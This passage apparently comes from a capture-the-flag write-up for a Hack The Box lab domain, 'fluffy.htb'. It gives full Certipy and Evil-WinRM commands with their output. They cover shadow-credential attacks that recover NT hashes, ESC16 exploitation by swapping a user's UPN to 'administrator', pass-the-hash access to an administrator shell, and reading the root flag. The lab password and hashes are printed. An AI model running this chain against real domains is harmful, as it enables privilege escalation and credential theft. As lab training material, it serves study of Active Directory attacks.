[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

```

Got this hash `ca0f4f9e9eb8a092addf53bb03fc98c8` 

will try this using `evil-winrm`  

```
┌──(work)─(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.69 -u "CA_SVC" -H "ca0f4f9e9eb8a092addf53bb03fc98c8" 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

**The NTLM hash is valid, but the user doesn't have WinRM access** on the target **`10.10.11.69`**.

## `LDAP_SVC`

```
┌──(work)─(kali㉿kali)-[~]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'LDAP_SVC' -target '10.10.11.69' -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'dd40a5dd-1c01-178a-9331-dd30cfd824cf'
[*] Adding Key Credential with device ID 'dd40a5dd-1c01-178a-9331-dd30cfd824cf' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID 'dd40a5dd-1c01-178a-9331-dd30cfd824cf' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
```

got this hash `22151d74ba3de931a352cba1f9393a37` 

After failing to get remote access to other objects I looked for vulnerable templates

### `WINRM_SVC@FLUFFY.HTB`

```
┌──(work)─(kali㉿kali)-[~]
└─$ certipy find -u 'WINRM_SVC@FLUFFY.HTB' -hashes "33bd09dcd697600edf6b3a7af4875767" -dc-ip 10.10.11.69 -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250709132641_Certipy.txt'
[*] Wrote text output to '20250709132641_Certipy.txt'
[*] Saving JSON output to '20250709132641_Certipy.json'
[*] Wrote JSON output to '20250709132641_Certipy.json'
                                                                                                                                                             
┌──(work)─(kali㉿kali)-[~]
└─$ cat 20250709132641_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates

```

But found no vulnerability so i looked for the vulnerable templates in CA_SVC

 

### `CA_SVC@FLUFFY.HTB`

```
┌──(work)─(kali㉿kali)-[~]
└─$ certipy find -u 'ca_SVC@FLUFFY.HTB' -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69 -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250709132840_Certipy.txt'
[*] Wrote text output to '20250709132840_Certipy.txt'
[*] Saving JSON output to '20250709132840_Certipy.json'
[*] Wrote JSON output to '20250709132840_Certipy.json'
                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                       
┌──(work)─(kali㉿kali)-[~]
└─$ cat 20250709132840_Certipy.json                                                                                       
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "fluffy-DC01-CA",
      "DNS Name": "DC01.fluffy.htb",
      "Certificate Subject": "CN=fluffy-DC01-CA, DC=fluffy, DC=htb",
      "Certificate Serial Number": "3670C4A715B864BB497F7CD72119B6F5",
      "Certificate Validity Start": "2025-04-17 16:00:16+00:00",
      "Certificate Validity End": "3024-04-17 16:11:16+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Disabled Extensions": [
        "1.3.6.1.4.1.311.25.2"
      ],
      "Permissions": {
        "Owner": "FLUFFY.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "FLUFFY.HTB\\Domain Admins",
            "FLUFFY.HTB\\Enterprise Admins",
            "FLUFFY.HTB\\Administrators"
          ],
          "2": [
            "FLUFFY.HTB\\Domain Admins",
            "FLUFFY.HTB\\Enterprise Admins",
            "FLUFFY.HTB\\Administrators"
          ],
          "512": [
            "FLUFFY.HTB\\Cert Publishers"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC16": "Security Extension is disabled."
      },
      "[*] Remarks": {
        "ESC16": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."
      }
    }
  },
  "Certificate Templates": "[!] Could not find any certificate templates"
}                                                                                                                                                             

```

Fortunately it has  `"ESC16": "Security Extension is disabled."` 

Now I looked into  `"ESC16": "Security Extension is disabled"` to understand what is it and how can it be exploited.

## **`"ESC16": "Security Extension is disabled."`**

`Attacker = p.agila`

`Victim = CA_SVC`

The exploitation mechanisms for ESC16 are identical to those for ESC9 because the end result - a certificate lacking the SID security extension - is the same. The important difference is that for ESC16, *any* certificate template enabling client authentication and issued by this misconfigured CA can be used in the UPN manipulation attack, not just a template specifically flagged with `CT_FLAG_NO_SECURITY_EXTENSION`.

- **Step 1: Read initial UPN of the victim account (Optional - for restoration)**
    
    ```bash
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy account -u 'ca_SVC@FLUFFY.HTB' -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip '10.10.11.69' -user 'administrator' read           
    Certipy v5.0.3 - by Oliver Lyak (ly4k)
    
    [*] Reading attributes for 'Administrator':
        cn                                  : Administrator
        distinguishedName                   : CN=Administrator,CN=Users,DC=fluffy,DC=htb
        name                                : Administrator
        objectSid                           : S-1-5-21-497550768-2797716248-2627064577-500
        sAMAccountName                      : Administrator
        userAccountControl                  : 66048
        whenCreated                         : 2025-04-17T15:59:25+00:00
        whenChanged                         : 2025-07-09T18:17:16+00:00
                                                                        
    ```
    

- **Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.**
    
    ```bash
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy-ad account -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator@fluffy.htb'  -user 'ca_svc' update
    Certipy v5.0.2 - by Oliver Lyak (ly4k)
    
    [*] Updating user 'ca_svc':
        userPrincipalName                   : administrator@fluffy.htb
    [*] Successfully updated 'ca_svc'
    ```
    
- **Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**
    
    ```
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy shadow -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
    Certipy v5.0.3 - by Oliver Lyak (ly4k)
    
    [*] Targeting user 'ca_svc'
    [*] Generating certificate
    [*] Certificate generated
    [*] Generating Key Credential
    [*] Key Credential generated with DeviceID '405ee41ddaf34df4b41be0a6da85b599'
    [*] Adding Key Credential with device ID '405ee41ddaf34df4b41be0a6da85b599' to the Key Credentials for 'ca_svc'
    [*] Successfully added Key Credential with device ID '405ee41ddaf34df4b41be0a6da85b599' to the Key Credentials for 'ca_svc'
    [*] Authenticating as 'ca_svc' with the certificate
    [*] Certificate identities:
    [*]     No identities found in this certificate
    [*] Using principal: 'ca_svc@fluffy.htb'
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saving credential cache to 'ca_svc.ccache'
    File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
    [*] Wrote credential cache to 'ca_svc.ccache'
    [*] Trying to retrieve NT hash for 'ca_svc'
    [*] Restoring the old Key Credentials for 'ca_svc'
    [*] Successfully restored the old Key Credentials for 'ca_svc'
    [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
    
    ```
    
    NT hash = `ca0f4f9e9eb8a092addf53bb03fc98c8`
    
- **Step 4: Request a certificate as the "victim" user from *any suitable client authentication template* (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):
    
    ```bash
                                                                                                                                              
    ┌──(work)─(kali㉿kali)-[~]
    └─$ export KRB5CCNAME=ca_svc.ccache
    ```
    

- Then request the certificate:
    
    ```bash
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy-ad  req -k -dc-ip 10.10.11.69 -target 'DC01.FLUFFY.HTB' -ca 'FLUFFY-DC01-CA' -template 'User'
    Certipy v5.0.2 - by Oliver Lyak (ly4k)
    
    [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
    [*] Requesting certificate via RPC
    [*] Request ID is 16
    [*] Successfully requested certificate
    [*] Got certificate with UPN 'administrator@fluffy.htb'
    [*] Certificate has no object SID
    [*] Try using -sid to set the object SID or see the wiki for more details
    [*] Saving certificate and private key to 'administrator.pfx'
    [*] Wrote certificate and private key to 'administrator.pfx'
    
    ```
    

- **Step 5: Revert the "victim" account's UPN.**
    
    ```bash
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy-ad account -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
     
    Certipy v5.0.2 - by Oliver Lyak (ly4k)
    
    [*] Updating user 'ca_svc':
        userPrincipalName                   : ca_svc@fluffy.htb
    [*] Successfully updated 'ca_svc'
    ```
    

- **Step 6: Authenticate as the target administrator.**
    
    ```bash
    ┌──(work)─(kali㉿kali)-[~]
    └─$ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.69' -username 'administrator' -domain 'fluffy.htb'
    Certipy v5.0.3 - by Oliver Lyak (ly4k)
    
    [*] Certificate identities:
    [*]     SAN UPN: 'administrator@fluffy.htb'
    [*] Using principal: 'administrator@fluffy.htb'
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saving credential cache to 'administrator.ccache'
    [*] Wrote credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
    ```
    
     administrator hash `ad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e`
    

## Administrator Access:

Using e`vil-winrm`  i got the shell of `Administrator` 

```bash
┌──(work)─(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Got the root flag

```bash
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2025   8:20 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d003560ccbace6f865737605a177b0b8
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

`root flag = d003560ccbace6f865737605a177b0b8`
